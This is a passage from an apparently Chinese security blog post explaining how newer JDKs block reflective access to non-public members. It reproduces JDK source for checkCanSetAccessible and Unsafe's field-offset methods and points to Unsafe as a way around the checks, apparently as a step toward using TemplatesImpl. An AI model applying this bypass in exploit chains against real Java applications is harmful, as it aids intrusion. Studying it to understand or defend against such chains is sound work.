+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>base</span><span class=o>/</span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>AccessibleObject</span><span class=p>.</span><span class=na>checkCanSetAccessible</span><span class=p>(</span><span class=n>AccessibleObject</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>354</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>base</span><span class=o>/</span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>AccessibleObject</span><span class=p>.</span><span class=na>checkCanSetAccessible</span><span class=p>(</span><span class=n>AccessibleObject</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>297</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>base</span><span class=o>/</span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Method</span><span class=p>.</span><span class=na>checkCanSetAccessible</span><span class=p>(</span><span class=n>Method</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>199</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>base</span><span class=o>/</span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>reflect</span><span class=p>.</span><span class=na>Method</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=n>Method</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>193</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>example</span><span class=p>.</span><span class=na>test</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>test</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>16</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Process</span><span class=w> </span><span class=n>finished</span><span class=w> </span><span class=n>with</span><span class=w> </span><span class=n>exit</span><span class=w> </span><span class=n>code</span><span class=w> </span><span class=n>1</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>跟着报错栈浅浅看了眼，就是最后的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>checkCanSetAccessible</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>caller</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                          </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>declaringClass</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                          </span><span class=kt>boolean</span><span class=w> </span><span class=n>throwExceptionIfDenied</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>caller</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>MethodHandle</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>IllegalCallerException</span><span class=p>();</span><span class=w>   </span><span class=c1>// should not happen</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Module</span><span class=w> </span><span class=n>callerModule</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>caller</span><span class=p>.</span><span class=na>getModule</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Module</span><span class=w> </span><span class=n>declaringModule</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>declaringClass</span><span class=p>.</span><span class=na>getModule</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>callerModule</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>declaringModule</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>callerModule</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getModule</span><span class=p>())</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>declaringModule</span><span class=p>.</span><span class=na>isNamed</span><span class=p>())</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>pn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>declaringClass</span><span class=p>.</span><span class=na>getPackageName</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>modifiers</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Executable</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>modifiers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>((</span><span class=n>Executable</span><span class=p>)</span><span class=w> </span><span class=k>this</span><span class=p>).</span><span class=na>getModifiers</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>modifiers</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>((</span><span class=n>Field</span><span class=p>)</span><span class=w> </span><span class=k>this</span><span class=p>).</span><span class=na>getModifiers</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// class is public and package is exported to caller</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>boolean</span><span class=w> </span><span class=n>isClassPublic</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Modifier</span><span class=p>.</span><span class=na>isPublic</span><span class=p>(</span><span class=n>declaringClass</span><span class=p>.</span><span class=na>getModifiers</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>isClassPublic</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>declaringModule</span><span class=p>.</span><span class=na>isExported</span><span class=p>(</span><span class=n>pn</span><span class=p>,</span><span class=w> </span><span class=n>callerModule</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// member is public</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Modifier</span><span class=p>.</span><span class=na>isPublic</span><span class=p>(</span><span class=n>modifiers</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// member is protected-static</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Modifier</span><span class=p>.</span><span class=na>isProtected</span><span class=p>(</span><span class=n>modifiers</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>Modifier</span><span class=p>.</span><span class=na>isStatic</span><span class=p>(</span><span class=n>modifiers</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>isSubclassOf</span><span class=p>(</span><span class=n>caller</span><span class=p>,</span><span class=w> </span><span class=n>declaringClass</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// package is open to caller</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>declaringModule</span><span class=p>.</span><span class=na>isOpen</span><span class=p>(</span><span class=n>pn</span><span class=p>,</span><span class=w> </span><span class=n>callerModule</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>throwExceptionIfDenied</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// not accessible</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>msg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;Unable to make &#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Field</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>msg</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34;field &#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>msg</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=k>this</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34; accessible: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>declaringModule</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34; does not \&#34;&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>isClassPublic</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>Modifier</span><span class=p>.</span><span class=na>isPublic</span><span class=p>(</span><span class=n>modifiers</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>msg</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34;exports&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>else</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>msg</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34;opens&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>msg</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34; &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>pn</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34; to &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>callerModule</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>InaccessibleObjectException</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InaccessibleObjectException</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>printStackTraceWhenAccessFails</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>(</span><span class=n>System</span><span class=p>.</span><span class=na>err</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=n>e</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>AI 给我画了个树</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>graph</span><span class=w> </span><span class=n>TD</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Start</span><span class=o>[</span><span class=n>调用</span><span class=w> </span><span class=n>setAccessible</span><span class=o>]</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>A</span><span class=p>{</span><span class=n>是同一模块</span><span class=w> </span><span class=n>或</span><span class=w> </span><span class=n>调用者是</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>base</span><span class=w> </span><span class=n>或</span><span class=w> </span><span class=n>目标是未命名模块</span><span class=o>?</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>A</span><span class=w> </span><span class=o>--</span><span class=w> </span><span class=n>Yes</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>Allow</span><span class=o>[</span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=w>  </span><span class=n>允许访问</span><span class=o>]</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>A</span><span class=w> </span><span class=o>--</span><span class=w> </span><span class=n>No</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>B</span><span class=p>{</span><span class=n>目标包对调用者</span><span class=w> </span><span class=n>isOpen</span><span class=w> </span><span class=n>吗</span><span class=o>?</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>B</span><span class=w> </span><span class=o>--</span><span class=w> </span><span class=n>Yes</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>Allow</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>B</span><span class=w> </span><span class=o>--</span><span class=w> </span><span class=n>No</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>C</span><span class=p>{</span><span class=n>目标包对调用者</span><span class=w> </span><span class=n>isExported</span><span class=w> </span><span class=n>吗</span><span class=o>?</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>C</span><span class=w> </span><span class=o>--</span><span class=w> </span><span class=n>No</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>Deny</span><span class=o>[</span><span class=n>抛出异常</span><span class=w> </span><span class=n>InaccessibleObjectException</span><span class=o>]</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>C</span><span class=w> </span><span class=o>--</span><span class=w> </span><span class=n>Yes</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>D</span><span class=p>{</span><span class=n>目标类是</span><span class=w> </span><span class=n>Public</span><span class=w> </span><span class=n>且成员也是</span><span class=w> </span><span class=n>Public</span><span class=o>?</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>D</span><span class=w> </span><span class=o>--</span><span class=w> </span><span class=n>Yes</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>Allow</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>D</span><span class=w> </span><span class=o>--</span><span class=w> </span><span class=n>No</span><span class=w> </span><span class=o>--&gt;</span><span class=w> </span><span class=n>Deny</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/high-jdk-reflection-templatesimpl/1.png width=1546 height=534 loading=lazy alt=img></p><p>而我们就是遇到的这里，并不是 public，也就是说反射 private 和 protected 被完全堵死了，那还有机会吗，有的 XD 有的，他不会把反射这种酸爽的功能给舍弃的，我们看到 sun.misc.Unsafe</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@ForceInline</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=nf>objectFieldOffset</span><span class=p>(</span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>f</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NullPointerException</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>declaringClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>f</span><span class=p>.</span><span class=na>getDeclaringClass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>declaringClass</span><span class=p>.</span><span class=na>isHidden</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;can&#39;t get field offset on a hidden class: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>declaringClass</span><span class=p>.</span><span class=na>isRecord</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;can&#39;t get field offset on a record class: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>theInternalUnsafe</span><span class=p>.</span><span class=na>objectFieldOffset</span><span class=p>(</span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>传入一个反射的 <code>Field</code> 对象（非静态字段），返回该字段在对象内存布局中的</p><p>偏移量 (offset)。JVM 根本不检查 private 还是 public，直接向内存地址写数据。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@ForceInline</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=nf>staticFieldOffset</span><span class=p>(</span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>f</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NullPointerException</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>declaringClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>f</span><span class=p>.</span><span class=na>getDeclaringClass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>declaringClass</span><span class=p>.</span><span class=na>isHidden</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;can&#39;t get field offset on a hidden class: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>declaringClass</span><span class=p>.</span><span class=na>isRecord</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;can&#39;t get field offset on a record class: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>theInternalUnsafe</span><span class=p>.</span><span class=na>staticFieldOffset</span><span class=p>(</span><span class=n>f</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>获取静态字段的内存偏移量</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@ForceInline</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>staticFieldBase</span><span class=p>(</span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>f</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NullPointerException</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>declaringClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>f</span><span class=p>.</span><span class=na>getDeclaringClass</span><span class=p>();</span><span class=w>
